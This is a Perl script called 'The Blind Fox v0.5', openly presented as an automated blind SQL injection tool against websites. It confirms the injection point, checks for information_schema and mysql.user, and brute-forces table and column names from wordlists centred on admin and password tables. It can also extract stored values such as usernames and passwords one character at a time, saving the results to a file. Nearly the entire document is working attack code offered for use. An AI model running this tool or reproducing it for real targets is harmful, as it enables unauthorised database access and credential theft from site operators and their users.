#!/usr/bin/perl

###########################################################################################
#                           -[+]- The Blind Fox v0.5 | By Login-Root -[+]-              ###
###########################################################################################

###########################################################################################
# [+] inf0:                                                                             ###
###########################################################################################
# It Searchs:                                                                           ###
# ===========                                                                           ###
#  - Check AND 1=1 && AND 1=0                                                           ###        
#  - Information_Schema && MySQL.User                                                   ###
#  - Tables                                                                             ###                                                
#  - Columns                                                                            ###
#  - Extract values from tables (Optional)                                              ###
#                                                                                       ###
#  ...and save it on a nice text file.                                                  ###
#                                                                                       ###
###########################################################################################

###########################################################################################
# [+] Use:                                                                              ###
###########################################################################################
# perl blindfox.pl [WEBSITE] [PATTERN] [FILE] [-EXT]                                    ###
#   [WEBSITE]: http://www.web.com/index.php?id=4875 (Use a valid number)                ###
#   [PATTERN]: Pattern that exists with AND 1=1, and that does not exist with AND 1=0   ###
#   [FILE]:    File where save the results                                              ###
#   [-EXT]:    To extract user names, passwords, etc. (Optional)                        ###
###########################################################################################

###########################################################################################
# [+] c0ntact:                                                                          ###
###########################################################################################
# MSN:    no.more@passport.com                                                          ###
# Jabber: login-root@x23.eu                                                             ### 
# E-Mail: login_root@yahoo.com.ar                                                       ###
###########################################################################################

###########################################################################################
# [+] sh0utz:                                                                           ###
###########################################################################################
# In memory of ka0x | Greetz: KSHA ; Psiconet ; Knet ; VenoM ; InyeXion                 ###
# Many thanks to boER, who teach me a little of perl ;D                                 ###
# VISIT: WWW.MITM.CL | WWW.REMOTEEXECUTION.ORG | WWW.DIOSDELARED.COM                    ###
###########################################################################################

###########################################################################################
# ARGENTINA PRODUCT :)                                                                  ###
###########################################################################################

use LWP::Simple;

if(!$ARGV[2])
	{
		 print "\n\n-[+]- The Blind Fox v0.5 | By Login-Root -[+]-\n==============================================";
		 print "\n\nUse: perl $0 [WEBSITE] [PATTERN] [FILE] [-EXT]\n";
		 print "\n[WEBSITE]: http://www.web.com/index.php?id=4875 (Use a valid number)\n[PATTERN]: Pattern that exists with AND 1=1, and that does not exist with AND 1=0\n[FILE]:    File where save the results\n[-EXT]:    To extract user names, passwords, etc. (Optional)\n\n";
		 exit (0);
	}
	
sub end()
{
	print WEB "\n\n\n[*EOF*]";
    print "\n\n[+] Everything saved correctly in $ARGV[2]\n\n";
    print "## c0ded by Login-Root | 2008 ##\n\n";
    exit (0);  
}    

	
@nombretabla=('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
	  'name','names','nombre','nombres','member','members','admin_table',
	  'miembro','miembros','membername','admins','administrator','sign',
	  'administrators','passwd','password','passwords','pass','Pass',
	  'tAdmin','tadmin','user_password','usuarios','user_passwords','user_name','user_names',
	  'member_password','mods','mod','moderators','moderator','user_email',
	  'user_emails','user_mail','user_mails','mail','emails','email','address',
	  'e-mail','emailaddress','correo','correos','phpbb_users','log','logins',
	  'login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
	  'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador',
	  'tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
	  'sistema_usuario','sistema_password','contrasena','auth','key','senha','signin',
	  'tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member','club_authors',
      'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization',
      'membros','utilizadores','staff','nuke_authors','accounts','account','accnts','signup',
      'associated','accnt','customers','customer','membres','administrateur','utilisateur',
      'tuser','tusers','utilisateurs','password','amministratore','god','God','authors','wp_users',
      'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members',
	  'Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');

@nombrecolumna=('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
          'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
          'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author','user_login',
          'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
          'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
          'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');

if ( $ARGV[0]   !~   /^http:/ ) 
  {
      $ARGV[0] = "http://" . $ARGV[0];
  }

open(WEB,">>".$ARGV[2]) || die "\n\n[-] Failed creating the file\n";
print WEB "[WEBSITE]:\n\n$ARGV[0]\n";
print "\n[!] Checking for the pattern...\n";
      $sql=$ARGV[0]." AND 1=1";
      $response=get($sql);
      if($response =~ /$ARGV[1]/)
        {
            print "\n[+] Pattern found with AND 1=1\n";
            print WEB "$sql => OK !\n";
            $sql=$ARGV[0]." AND 1=0";
            $response=get($sql);
            if($response =~ /$ARGV[1]/)
            {
            	print "[-] Pattern found with AND 1=0 too, website possible to not be vulnerable, try with another pattern\n";
            	exit (0);
            }
            else
            {
            	print "[+] Pattern not found with AND 1=0, website vulnerable to Blind SQL Inyection\n";
            	print WEB "$sql => OK !\n";
            }
         }
         else
         		{
         			print "[-] Pattern not found, try with another\n";
         			exit (0);
         		}
        print "\n[!] Checking if Information_Schema exists...";
        $sql=$ARGV[0]." AND (SELECT Count(*) FROM information_schema.tables)";
        $response=get($sql);
         if($response =~ /$ARGV[1]/)
         	{
         		print "\n[+] Information_Schema available...saving in $ARGV[2]";
                print WEB "\n\n[INFORMATION_SCHEMA]:\n\n$sql\n";
            	
         	}
         else
         	{
            	print "\n[-] Information_Schema unavailable";
         	}
        print "\n[!] Checking if MySQL.User exists...";
        $sql=$ARGV[0]." AND (SELECT Count(*) FROM mysql.user)";
        $response=get($sql);
         if($response =~ /$ARGV[1]/)
         	{
         		print "\n[+] MySQL.User available...saving in $ARGV[2]";
                print WEB "\n\n[MYSQL.USER]:\n\n$sql\n";
            	
         	}
         else
         	{
            	print "\n[-] MySQL.User unavailable";
         	}
        print "\n\n[!] Bruteforcing tables...";
        print WEB "\n\n[TABLES]:\n\n";
        foreach $tabla(@nombretabla)
         {
                  chomp($tabla);
                  $sql=$ARGV[0]." AND (SELECT Count(*) FROM ".$tabla.")";
                  $response=get($sql);
                  if($response =~ /$ARGV[1]/)
                    {
                        print "\n[+] Table $tabla exists...saving in $ARGV[2]";
                        print WEB "$sql\n";
                    }
                }
        print "\n\n[!] Table to brute force columns: ";
            $tabla.=<STDIN>;
            chomp($tabla);
            print WEB "\n\n[COLUMNS IN $tabla]:\n\n";
            foreach $columna(@nombrecolumna)
            {
             chomp($columna);
             $sql=$ARGV[0]." AND (SELECT Count(".$columna.") FROM ".$tabla.")";
             $response=get($sql);
             if ($response =~ /$ARGV[1]/)
                  {
                      print "\n[+] Column $columna available...saving in $ARGV[2]";
                      print WEB "$sql\n";
                  }
            }
         if ($ARGV[3] =~ /-EXT/)
         {
         	extrac:
         	$columna = '';
         	print "\n\n[!] Column of table $tabla to extract values: ";
         	$columna.=<STDIN>;
            chomp($columna);
         	print "[!] Extracting values from table $tabla and column $columna (Could take a long time)...\n\n";
         	print WEB "\n\n[Values of table $tabla and column $columna]:\n\n";
         	$search = 1;
         	$posicion = 1;
         	$limit = 0;
         	$comprob = 1;
         	while ($search <= 255)
         	{
         		$sql=$ARGV[0]." AND ascii(substring((SELECT " .$columna. " FROM " .$tabla." limit " .$limit.",1),".$posicion.",1)) = " .$search;
         		$response=get($sql);
         		if ($response =~ /$ARGV[1]/)
                  {
                  	  $char = chr($search);
                  	  print WEB "$char";
                  	  print "$char";
                      $search = 0;
                      $posicion++;
                      $comprob++;
                  }
                 if ($search == 255)
                 {
                 	print "\n";
                 	print WEB "\n";
                 	if ($comprob == 1)
                 	{
                 		$eleccion = '';
                 		print "[+] Search finished. Want to extract value from another column? [Y/N]: ";
                 		$eleccion.=<STDIN>;
                 		chomp($eleccion);
                 		if ($eleccion =~ /Y/)
                 		{
                 			goto extrac;
                 		}
                 		else
                 		{
                 		   end();
                 		}
                 	}
                 	$comprob = 1;
                 	$search = 0;
                    $limit++;
                 }
         		$search++;
            }
           }
end();